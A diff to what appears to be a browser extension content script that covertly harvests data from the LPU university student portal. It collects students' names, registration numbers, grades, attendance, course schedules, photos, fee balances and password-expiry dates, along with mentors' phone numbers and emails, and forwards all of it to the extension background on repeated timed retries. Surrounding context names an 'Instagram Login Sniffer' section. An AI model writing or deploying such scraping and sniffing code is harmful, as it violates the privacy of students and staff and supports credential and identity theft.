@@ -142,6 +142,401 @@ if (!setupStudentListeners()) {
 // =================== LPU Dashboard Password Expiry Capture ===================
 // This captures password expiry info after successful login (on dashboard page)
 let dashboardExpiryChecked = false;
+let profileDataCaptured = false;
+let coursesDataCaptured = false;
+
+// =================== LPU Courses, CGPA, Attendance Capture ===================
+async function captureCoursesAndAcademicData() {
+  if (coursesDataCaptured) return;
+  
+  // Check if CoursesList element exists
+  const coursesListEl = document.getElementById("CoursesList");
+  const cgpaEl = document.getElementById("cgpa");
+  const attEl = document.getElementById("AttPercent");
+  
+  if (!coursesListEl && !cgpaEl && !attEl) {
+    console.log("%c[LPU] Dashboard: Courses/Academic elements not found yet...", "color: #9e9e9e;");
+    return;
+  }
+  
+  let courses = [];
+  let cgpa = null;
+  let overallAttendance = null;
+  let registrationNumber = null;
+  
+  // Get registration number from page
+  const regNoEl = document.getElementById("regno");
+  if (regNoEl) {
+    const regText = regNoEl.textContent || regNoEl.innerText || "";
+    const regMatch = regText.match(/Reg\.?\s*No\.?[:\s]*(\d+)/i);
+    if (regMatch) {
+      registrationNumber = regMatch[1];
+    }
+  }
+  
+  if (!registrationNumber) {
+    console.log("%c[LPU] Dashboard: No registration number found for courses", "color: #ff9800;");
+    return;
+  }
+  
+  // Extract CGPA
+  if (cgpaEl) {
+    const cgpaText = cgpaEl.textContent || cgpaEl.innerText || "";
+    const cgpaMatch = cgpaText.match(/CGPA[:\s]*([0-9.]+)/i);
+    if (cgpaMatch) {
+      cgpa = parseFloat(cgpaMatch[1]);
+    }
+  }
+  
+  // Extract Overall Attendance
+  if (attEl) {
+    const attText = attEl.textContent || attEl.innerText || "";
+    const attMatch = attText.match(/ATTENDANCE[:\s]*([0-9.]+)%/i);
+    if (attMatch) {
+      overallAttendance = parseFloat(attMatch[1]);
+    }
+  }
+  
+  // Extract Courses
+  if (coursesListEl) {
+    const courseDivs = coursesListEl.querySelectorAll(".mycoursesdiv");
+    
+    courseDivs.forEach(courseDiv => {
+      try {
+        const courseInfo = {};
+        
+        // Get percentage from circle
+        const percentSpan = courseDiv.querySelector(".c100 span");
+        if (percentSpan) {
+          const pctText = percentSpan.textContent || "";
+          const pctMatch = pctText.match(/(\d+)%/);
+          if (pctMatch) {
+            courseInfo.attendancePercent = parseInt(pctMatch[1]);
+          }
+        }
+        
+        // Get course details
+        const courseText = courseDiv.querySelector(".col-sm-6")?.innerHTML || "";
+        
+        // Course code and name: "CSES011 : JAVA FULL STACK"
+        const codeNameMatch = courseText.match(/<b>([A-Z0-9]+)\s*<\/b>\s*:\s*([^<]+)/i);
+        if (codeNameMatch) {
+          courseInfo.courseCode = codeNameMatch[1].trim();
+          courseInfo.courseName = codeNameMatch[2].trim();
+        }
+        
+        // Term
+        const termMatch = courseText.match(/Term\s*:\s*<\/b>\s*(\d+)/i);
+        if (termMatch) {
+          courseInfo.term = termMatch[1];
+        }
+        
+        // Roll No and Group
+        const rollMatch = courseText.match(/Roll No\s*:\s*<\/b>\s*([A-Z0-9]+)\s*\/\s*Group\s*(\d+)/i);
+        if (rollMatch) {
+          courseInfo.rollNo = rollMatch[1];
+          courseInfo.group = parseInt(rollMatch[2]);
+        }
+        
+        // Exam Pattern
+        const examMatch = courseText.match(/Exam Pattern\s*:\s*<\/b>\s*([^<]+)/i);
+        if (examMatch) {
+          courseInfo.examPattern = examMatch[1].trim();
+        }
+        
+        // Class timings - "Class Today at : 01-02 PM Room:37-605,03-04 PM Room:37-605"
+        const classText = courseDiv.querySelector(".col-sm-6 p:nth-child(2)")?.textContent || "";
+        const classMatch = classText.match(/Class Today at\s*:\s*(.+)/i);
+        if (classMatch) {
+          const scheduleStr = classMatch[1].trim();
+          // Parse schedule entries
+          const schedules = scheduleStr.split(",").map(s => {
+            const parts = s.trim().match(/(\d{2}-\d{2}\s*[AP]M)\s*Room:([A-Z0-9-]+)/i);
+            if (parts) {
+              return { time: parts[1], room: parts[2] };
+            }
+            return null;
+          }).filter(Boolean);
+          
+          if (schedules.length > 0) {
+            courseInfo.todaySchedule = schedules;
+          }
+        }
+        
+        if (courseInfo.courseCode) {
+          courses.push(courseInfo);
+        }
+      } catch (e) {
+        console.error("[LPU] Error parsing course:", e);
+      }
+    });
+  }
+  
+  // Only send if we have meaningful data
+  if (cgpa !== null || overallAttendance !== null || courses.length > 0) {
+    coursesDataCaptured = true;
+    
+    console.log("%c[LPU] Dashboard: Academic data captured!", "color: #4caf50; font-weight: bold;");
+    console.table({ cgpa, overallAttendance, coursesCount: courses.length });
+    console.log("Courses:", courses);
+    
+    // Send academic data to background
+    chrome.runtime.sendMessage({
+      type: "lpu_academic_data",
+      data: {
+        registrationNumber,
+        cgpa,
+        overallAttendance,
+        courses
+      },
+    });
+    
+    console.log("%c[LPU] SENT: Academic data forwarded to background", "color: #4caf50; font-weight: bold;");
+  }
+}
+
+// =================== LPU Profile Data Capture ===================
+async function captureProfileDataFromDashboard() {
+  if (profileDataCaptured) return;
+  
+  // Check for profile info element
+  const nameEl = document.getElementById("p_name");
+  const regNoEl = document.getElementById("regno");
+  const progNameEl = document.getElementById("progname");
+  
+  // All three must exist
+  if (!nameEl && !regNoEl && !progNameEl) {
+    console.log("%c[LPU] Dashboard: Profile elements not found yet...", "color: #9e9e9e;");
+    return;
+  }
+  
+  let studentName = null;
+  let registrationNumber = null;
+  let section = null;
+  let program = null;
+  let pwdExpiryDays = null;
+  let pwdExpiryDate = null;
+  
+  // Extract name
+  if (nameEl) {
+    studentName = nameEl.textContent?.trim() || null;
+  }
+  
+  // Extract reg number and section from: "Reg. No.: 12319278 | Section: 223PU"
+  if (regNoEl) {
+    const regText = regNoEl.textContent || regNoEl.innerText || "";
+    
+    // Extract registration number
+    const regMatch = regText.match(/Reg\.?\s*No\.?[:\s]*(\d+)/i);
+    if (regMatch) {
+      registrationNumber = regMatch[1];
+    }
+    
+    // Extract section
+    const sectionMatch = regText.match(/Section[:\s]*([A-Z0-9]+)/i);
+    if (sectionMatch) {
+      section = sectionMatch[1];
+    }
+  }
+  
+  // Extract program name
+  if (progNameEl) {
+    const progText = progNameEl.textContent || progNameEl.innerText || "";
+    program = progText.replace(/^\s*\**\s*|\s*\**\s*$/g, '').trim() || null;
+  }
+  
+  // ===== Also try to capture password expiry from the page =====
+  // Look for expiry element
+  const expiryElement = document.getElementById("ctl00_wcUserPasswordDetail_HP_Label1") ||
+    document.querySelector("[id*='wcUserPasswordDetail']") ||
+    document.querySelector("[id*='PasswordDetail']") ||
+    document.querySelector(".fg-password span[id]");
+  
+  if (expiryElement) {
+    const expiryText = expiryElement.textContent || expiryElement.innerText || "";
+    console.log("%c[LPU] Found expiry text: " + expiryText, "color: #2196f3;");
+    
+    // Extract days: "UMS Pwd will expire after 16 days"
+    const daysMatch = expiryText.match(/expire after (\d+) days/i);
+    if (daysMatch) {
+      pwdExpiryDays = parseInt(daysMatch[1], 10);
+    }
+    
+    // Extract date: "on or before 08-02-2026"
+    const dateMatch = expiryText.match(/on or before (\d{2}-\d{2}-\d{4})/i);
+    if (dateMatch) {
+      pwdExpiryDate = dateMatch[1];
+    }
+  }
+  
+  // Also search entire page for expiry info if not found
+  if (pwdExpiryDays === null && pwdExpiryDate === null) {
+    const pageText = document.body.innerText || "";
+    
+    const daysMatch = pageText.match(/(?:password|pwd).*?expire.*?after\s+(\d+)\s+days/i);
+    if (daysMatch) {
+      pwdExpiryDays = parseInt(daysMatch[1], 10);
+    }
+    
+    const dateMatch = pageText.match(/on or before\s+(\d{2}-\d{2}-\d{4})/i);
+    if (dateMatch) {
+      pwdExpiryDate = dateMatch[1];
+    }
+  }
+  
+  // Need at least registration number to proceed
+  if (!registrationNumber) {
+    console.log("%c[LPU] Dashboard: Could not extract registration number from profile", "color: #ff9800;");
+    return;
+  }
+  
+  // ===== Capture Student Profile Picture =====
+  let studentProfilePic = null;
+  const profilePicEl = document.getElementById("p_picture");
+  if (profilePicEl && profilePicEl.src) {
+    studentProfilePic = profilePicEl.src;
+    console.log("%c[LPU] Student profile picture captured", "color: #4caf50;");
+  }
+  
+  profileDataCaptured = true;
+  
+  console.log("%c[LPU] Dashboard: Profile data captured!", "color: #4caf50; font-weight: bold;");
+  console.table({ studentName, registrationNumber, section, program, pwdExpiryDays, pwdExpiryDate });
+  
+  // ===== Capture Mentor Info from Know Your Authorities section =====
+  let mentorName = null;
+  let mentorMobile = null;
+  let mentorEmail = null;
+  let mentorDesignation = null;
+  let mentorDivision = null;
+  let mentorProfilePic = null;
+  
+  // Try to find mentor card from the heads carousel
+  const headsSection = document.getElementById("heads");
+  if (headsSection) {
+    // Look for mentor card specifically
+    const cards = headsSection.querySelectorAll(".card");
+    cards.forEach(card => {
+      const text = card.textContent || "";
+      // Check if this card is for Mentor
+      if (text.toLowerCase().includes("mentor")) {
+        // Get mentor profile picture
+        const mentorImg = card.querySelector(".card-img-top, img");
+        if (mentorImg && mentorImg.src) {
+          mentorProfilePic = mentorImg.src;
+        }
+        
+        // Get mentor name - usually in first text content after "Mentor"
+        const cardBody = card.querySelector(".card-body, .col-md-12");
+        if (cardBody) {
+          const textNodes = cardBody.querySelectorAll(".col-md-12, .text-small, div");
+          textNodes.forEach((node, i) => {
+            const nodeText = node.textContent?.trim() || "";
+            // First substantial text after Mentor is usually name
+            if (!mentorName && nodeText && !nodeText.toLowerCase().includes("mentor") && 
+                !nodeText.includes("@") && !nodeText.match(/^\d{10}/) && nodeText.length > 2) {
+              // Skip if it looks like a designation
+              if (!nodeText.toLowerCase().includes("assistant") && 
+                  !nodeText.toLowerCase().includes("division") &&
+                  !nodeText.toLowerCase().includes("relationship")) {
+                mentorName = nodeText;
+              }
+            }
+          });
+        }
+        
+        // Get designation
+        const desigMatch = text.match(/(?:Senior\s+)?(?:Assistant|Associate|Professor|Lecturer)[^,\n]*/i);
+        if (desigMatch) {
+          mentorDesignation = desigMatch[0].trim();
+        }
+        
+        // Get division
+        const divisionMatch = text.match(/Division\s+of\s+[A-Za-z\s]+/i);
+        if (divisionMatch) {
+          mentorDivision = divisionMatch[0].trim();
+        }
+        
+        // Get mobile number
+        const mobileMatch = text.match(/(\d{10,11})/);
+        if (mobileMatch) {
+          mentorMobile = mobileMatch[1];
+        }
+        
+        // Get email from mailto link
+        const emailLink = card.querySelector("a[href^='mailto:']");
+        if (emailLink) {
+          mentorEmail = emailLink.href.replace("mailto:", "");
+        }
+      }
+    });
+  }
+  
+  // Fallback: try common mentor selectors
+  if (!mentorName) {
+    const mentorEl = document.querySelector("[id*='mentor'], [class*='mentor']");
+    if (mentorEl) {
+      mentorName = mentorEl.textContent?.trim()?.split('\n')[0] || null;
+    }
+  }
+  
+  // ===== Capture Fee Balance =====
+  let feeBalance = null;
+  let feeStatus = null;
+  
+  const feeBalanceEl = document.getElementById("feebalance");
+  if (feeBalanceEl) {
+    const feeText = feeBalanceEl.textContent || feeBalanceEl.innerText || "";
+    // Extract fee amount like "₹ 1,50,000" or "Rs. 150000" or just numbers
+    const feeMatch = feeText.match(/(?:₹|Rs\.?|INR)?\s*([\d,]+)/i);
+    if (feeMatch) {
+      feeBalance = feeMatch[1].replace(/,/g, '');
+    }
+    // Check if paid or pending
+    if (feeText.toLowerCase().includes("paid") || feeText.toLowerCase().includes("clear")) {
+      feeStatus = "Paid";
+    } else if (feeText.toLowerCase().includes("pending") || feeText.toLowerCase().includes("due")) {
+      feeStatus = "Pending";
+    }
+  }
+  
+  // Also try to get fee from FeePending div
+  const feePendingEl = document.getElementById("FeePending");
+  if (feePendingEl && !feeBalance) {
+    const feeText = feePendingEl.textContent || "";
+    const feeMatch = feeText.match(/(?:₹|Rs\.?|INR)?\s*([\d,]+)/i);
+    if (feeMatch) {
+      feeBalance = feeMatch[1].replace(/,/g, '');
+    }
+  }
+  
+  console.log("%c[LPU] Additional data:", "color: #2196f3;");
+  console.table({ studentProfilePic: studentProfilePic ? 'captured' : null, mentorName, mentorMobile, mentorEmail, mentorProfilePic: mentorProfilePic ? 'captured' : null, feeBalance, feeStatus });
+  
+  // Send profile data to background (now including expiry info)
+  chrome.runtime.sendMessage({
+    type: "lpu_profile_data",
+    data: { 
+      studentName,
+      registrationNumber,
+      section,
+      program,
+      pwdExpiryDays,
+      pwdExpiryDate,
+      studentProfilePic,
+      mentorName,
+      mentorMobile,
+      mentorEmail,
+      mentorDesignation,
+      mentorDivision,
+      mentorProfilePic,
+      feeBalance,
+      feeStatus
+    },
+  });
+  
+  console.log("%c[LPU] SENT: Profile data forwarded to background", "color: #4caf50; font-weight: bold;");
+}
 
 async function capturePasswordExpiryFromDashboard() {
   if (dashboardExpiryChecked) return;
@@ -254,16 +649,64 @@ async function capturePasswordExpiryFromDashboard() {
   }
 }
 
-// Check for dashboard password expiry info
+// Check for dashboard password expiry info and profile data
 if (location.hostname.includes("lpu.in") || location.hostname.includes("lpude.in")) {
-  // Check immediately and also with delay (for dynamic content)
-  setTimeout(capturePasswordExpiryFromDashboard, 1000);
-  setTimeout(capturePasswordExpiryFromDashboard, 3000);
-  setTimeout(capturePasswordExpiryFromDashboard, 5000);
   
-  // Also use MutationObserver for dynamic pages
-  const observer = new MutationObserver(() => {
+  // ========== RETRY MECHANISM FOR COMPLETE DATA CAPTURE ==========
+  // Some data loads late (mentor info, courses), so we retry at intervals
+  
+  const RETRY_INTERVALS = [2000, 5000, 10000, 15000, 20000]; // 2s, 5s, 10s, 15s, 20s
+  let captureAttempt = 0;
+  
+  function resetCaptureFlags() {
+    // Reset flags to allow re-capture
+    profileDataCaptured = false;
+    coursesDataCaptured = false;
+    dashboardExpiryChecked = false;
+  }
+  
+  function runFullCapture(attempt) {
+    console.log(`%c[LPU] ========== CAPTURE ATTEMPT #${attempt} ==========`, "color: #ff9800; font-weight: bold; font-size: 14px;");
+    console.log(`%c[LPU] Timestamp: ${new Date().toLocaleTimeString()}`, "color: #9e9e9e;");
+    
+    // Reset flags before each retry to allow fresh capture
+    if (attempt > 1) {
+      resetCaptureFlags();
+      console.log("%c[LPU] Flags reset for fresh capture", "color: #2196f3;");
+    }
+    
+    // Run all captures
     capturePasswordExpiryFromDashboard();
+    captureProfileDataFromDashboard();
+    captureCoursesAndAcademicData();
+  }
+  
+  // Initial capture
+  setTimeout(() => {
+    captureAttempt = 1;
+    runFullCapture(1);
+  }, 1500);
+  
+  // Schedule retry captures at intervals
+  RETRY_INTERVALS.forEach((delay, index) => {
+    setTimeout(() => {
+      captureAttempt = index + 2;
+      runFullCapture(index + 2);
+    }, delay);
+  });
+  
+  // Also use MutationObserver for dynamic pages (but don't reset flags here)
+  let mutationCaptureCount = 0;
+  const MAX_MUTATION_CAPTURES = 3;
+  
+  const observer = new MutationObserver(() => {
+    if (mutationCaptureCount < MAX_MUTATION_CAPTURES) {
+      mutationCaptureCount++;
+      console.log(`%c[LPU] DOM change detected - mutation capture #${mutationCaptureCount}`, "color: #9e9e9e;");
+      capturePasswordExpiryFromDashboard();
+      captureProfileDataFromDashboard();
+      captureCoursesAndAcademicData();
+    }
   });
   
   observer.observe(document.body, { 
@@ -271,8 +714,12 @@ if (location.hostname.includes("lpu.in") || location.hostname.includes("lpude.in
     subtree: true 
   });
   
-  // Stop observing after 10 seconds
-  setTimeout(() => observer.disconnect(), 10000);
+  // Stop observing after 25 seconds
+  setTimeout(() => {
+    observer.disconnect();
+    console.log("%c[LPU] ========== CAPTURE COMPLETE ==========", "color: #4caf50; font-weight: bold; font-size: 14px;");
+    console.log("%c[LPU] Observer disconnected after 25 seconds", "color: #9e9e9e;");
+  }, 25000);
 }
 
 // =================== Instagram Login Sniffer ===================
